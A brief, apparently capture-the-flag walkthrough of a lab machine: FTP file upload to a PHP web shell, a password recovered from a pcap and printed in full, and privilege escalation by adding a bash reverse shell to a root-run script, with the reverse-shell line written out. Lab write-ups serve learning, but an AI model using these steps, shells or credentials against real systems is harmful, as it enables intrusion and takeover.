As always start with nmap

21
22
80

***

ftp

username : Maya

we can upload files in /ftp folder.

***
/files 

it list containt of ftp share. as we can upload the files in it. upload php shell got shell as www-data.

foun pcap file after anaysing it found lennie's password.

c4ntg3t3n0ughsp1c3 : lennie
***

```sh
$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh


```

we can edit `print.sh` add rev shell into it. got root.

bash -i >& /dev/tcp/10.8.133.3/1337 0>&1